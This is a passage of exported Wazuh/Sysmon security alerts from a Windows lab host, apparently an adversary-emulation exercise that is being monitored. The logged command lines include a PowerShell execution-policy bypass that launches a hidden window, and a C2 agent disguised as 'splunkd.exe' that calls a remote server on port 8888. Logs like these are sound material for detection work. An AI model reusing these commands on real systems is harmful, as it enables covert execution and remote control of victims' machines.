Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir8340_1876417444\CRX_INSTALL\background.js
CreationUtcTime: 2024-12-10 18:14:08.981
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:14:08.9850726Z,11184,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,61,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:14:09.310",EventChannel,1733854449,"Dec 10, 2024 @ 18:14:09.310", , , , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-84d7-6758-1b05-000000000300},8340,14:09.0, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir8340_1876417444\\CRX_INSTALL\\background.js,14:09.0, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,ofRRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 18:14:09.028
ProcessGuid: {15959494-84d7-6758-1b05-000000000300}
ProcessId: 8340
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir8340_1876417444\CRX_INSTALL\polyfills.js
CreationUtcTime: 2024-12-10 18:14:09.028
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:14:09.0308776Z,11187,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,64,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:14:09.373",EventChannel,1733854449,"Dec 10, 2024 @ 18:14:09.373", , , , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-84d7-6758-1b05-000000000300},8340,14:09.0, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir8340_1876417444\\CRX_INSTALL\\polyfills.js,14:09.0, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,pPRRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:14:22.378
ProcessGuid: {15959494-84fd-6758-5105-000000000300}
ProcessId: 8708
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_rkimjdov.i3w.ps1
CreationUtcTime: 2024-12-10 18:14:22.378
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:14:22.3854668Z,11199,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,67,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:14:22.723",EventChannel,1733854462,"Dec 10, 2024 @ 18:14:22.723", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-84fd-6758-5105-000000000300},8708,14:22.4, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_rkimjdov.i3w.ps1,14:22.4, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,pfRRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:14:23.749
ProcessGuid: {15959494-84ff-6758-5e05-000000000300}
ProcessId: 8480
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" calc.exe 
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {15959494-84fd-6758-5105-000000000300}
ParentProcessId: 8708
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""Start-Process powershell.exe -WindowStyle hidden calc.exe""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:14:23.7503178Z,11226,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,4,FALSE,4,Powershell process spawned powershell instance,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92027,windows_eventchannel,log,"Dec 10, 2024 @ 18:14:23.990",EventChannel,1733854463,"Dec 10, 2024 @ 18:14:23.990", , , , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-84ff-6758-5e05-000000000300},8480,14:23.7,"SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6","technique_id=T1059.001,technique_name=PowerShell",Microsoft Corporation,10.0.19041.3996 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""PowerShell""]","[""T1059.001""]","[""Execution""]", , , , , , , , , , , ,{15959494-84fd-6758-5105-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"powershell.exe -ExecutionPolicy Bypass -C \""Start-Process powershell.exe -WindowStyle hidden calc.exe\""",0xeacdd,8708,C:\\Users\\mari\\,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" calc.exe",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,qPRRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:15:15.546
ProcessGuid: {15959494-8533-6758-7c05-000000000300}
ProcessId: 4308
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_yetnhfnj.v5z.ps1
CreationUtcTime: 2024-12-10 18:15:15.546
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:15:15.5558719Z,11323,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,70,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:15:16.563",EventChannel,1733854516,"Dec 10, 2024 @ 18:15:16.563", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-8533-6758-7c05-000000000300},4308,15:15.5, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_yetnhfnj.v5z.ps1,15:15.5, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,qfRRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,4624,0x8020000000000000,{54849625-5478-4994-a5ba-3e3b0328c30d},0,Security,0,"""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-QGB4EQH$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x2b4
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-12-10T18:15:33.4875347Z,1064,1720,DESKTOP-QGB4EQH,12544,716,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,10,FALSE,3,Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,windows_eventchannel,log,"Dec 10, 2024 @ 18:15:34.339",EventChannel,1733854534,"Dec 10, 2024 @ 18:15:34.339", , , ,"[""IV_32.2""]","[""7.1"",""7.2""]", , , , , , , , , ,0x2b4, , , , , , ,"[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , ,"[""10.2.5""]","[""164.312.b""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AC.7"",""AU.14""]", , ,{00000000-0000-0000-0000-000000000000}, , , , , , , , , ,0x3e7,WORKGROUP,0x0,%%1833,Negotiate,0x3e7,Advapi,SYSTEM,0,%%1842,S-1-5-18,C:\\Windows\\System32\\services.exe,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-QGB4EQH$, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,q_RRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1001,0x80000000000000, ,4,Application,0,"""Fault bucket 1977224465115307931, type 5
Event Name: MoBEX
Response: Not available
Cab Id: 0

Problem signature:
P1: Microsoft.WindowsCalculator_10.2103.8.0_x64__8wekyb3d8bbwe
P2: praid:App
P3: 10.2103.8.0
P4: 6062256a
P5: ucrtbase.dll
P6: 10.0.19041.3636
P7: 81cf5d89
P8: 000000000007286e
P9: c0000409
P10: 0000000000000007

Attached files:
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER467C.tmp.mdmp
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER49D8.tmp.WERInternalMetadata.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER4A56.tmp.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER4A64.tmp.csv
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER4A75.tmp.txt

These files may be available here:
\\?\C:\ProgramData\Microsoft\Windows\WER\ReportArchive\AppCrash_Microsoft.Window_50a8d962b331cccce5287a15debbdfd311e6d796_45c74590_0c5798a1-9be9-4412-b436-c873abc34cd2

Analysis symbol: 
Rechecking for solution: 0
Report Id: 4d6c0554-cda2-4696-a5d8-0ac3a9b65e2d
Report Status: 2147487744
Hashed bucket: 2920b8a461d8f9d09b70832cdc68df9b
Cab Guid: 0""",0,2024-12-10T18:15:40.8295163Z,408,0,DESKTOP-QGB4EQH,0,0,INFORMATION,Windows Error Reporting,6,FALSE,4,Summary event of the report's signatures.,"[""windows"",""windows_application""]",60608,windows_eventchannel,log,"Dec 10, 2024 @ 18:15:40.612",EventChannel,1733854540,"Dec 10, 2024 @ 18:15:40.612","1977224465115307931, 5, MoBEX, Not available, 0, Microsoft.WindowsCalculator_10.2103.8.0_x64__8wekyb3d8bbwe, praid:App, 10.2103.8.0, 6062256a, ucrtbase.dll, 10.0.19041.3636, 81cf5d89, 000000000007286e, c0000409, 0000000000000007,   \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER467C.tmp.mdmp  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER49D8.tmp.WERInternalMetadata.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER4A56.tmp.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER4A64.tmp.csv  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER4A75.tmp.txt, \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\AppCrash_Microsoft.Window_50a8d962b331cccce5287a15debbdfd311e6d796_45c74590_0c5798a1-9be9-4412-b436-c873abc34cd2, 0, 4d6c0554-cda2-4696-a5d8-0ac3a9b65e2d, 2147487744, 2920b8a461d8f9d09b70832cdc68df9b, 0", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,rfRRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:15:54.885
ProcessGuid: {15959494-855a-6758-9005-000000000300}
ProcessId: 4532
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_fyvklg3j.qo2.ps1
CreationUtcTime: 2024-12-10 18:15:54.885
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:15:54.8978940Z,11372,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,71,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:15:55.622",EventChannel,1733854555,"Dec 10, 2024 @ 18:15:55.622", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-855a-6758-9005-000000000300},4532,15:54.9, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_fyvklg3j.qo2.ps1,15:54.9, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,rvRRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:15:57.754
ProcessGuid: {15959494-855d-6758-9e05-000000000300}
ProcessId: 8652
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_jlt0z2kn.wv5.ps1
CreationUtcTime: 2024-12-10 18:15:57.754
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:15:57.7780087Z,11412,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,72,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:15:58.646",EventChannel,1733854558,"Dec 10, 2024 @ 18:15:58.646", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-855d-6758-9e05-000000000300},8652,15:57.8, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_jlt0z2kn.wv5.ps1,15:57.8, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,sPRRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:16:47.025
ProcessGuid: {15959494-858e-6758-af05-000000000300}
ProcessId: 8004
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_vdovsj2b.ob3.ps1
CreationUtcTime: 2024-12-10 18:16:47.025
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:16:47.0406723Z,11464,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,74,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:16:47.605",EventChannel,1733854607,"Dec 10, 2024 @ 18:16:47.605", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-858e-6758-af05-000000000300},8004,16:47.0, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_vdovsj2b.ob3.ps1,16:47.0, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,sfRRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 18:17:20.799
ProcessGuid: {15959494-85b0-6758-be05-000000000300}
ProcessId: 1488
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C ""67baa5_GUP.exe""
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:17:20.8055288Z,11509,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,22,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 18:17:21.563",EventChannel,1733854641,"Dec 10, 2024 @ 18:17:21.563", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-85b0-6758-be05-000000000300},1488,17:20.8,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C \""67baa5_GUP.exe\""",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,svRRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:17:22.848
ProcessGuid: {15959494-85b2-6758-c005-000000000300}
ProcessId: 7932
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_5a0tcyce.zjy.ps1
CreationUtcTime: 2024-12-10 18:17:22.848
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:17:22.8605140Z,11522,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,75,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:17:23.693",EventChannel,1733854643,"Dec 10, 2024 @ 18:17:23.693", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-85b2-6758-c005-000000000300},7932,17:22.8, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_5a0tcyce.zjy.ps1,17:22.8, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
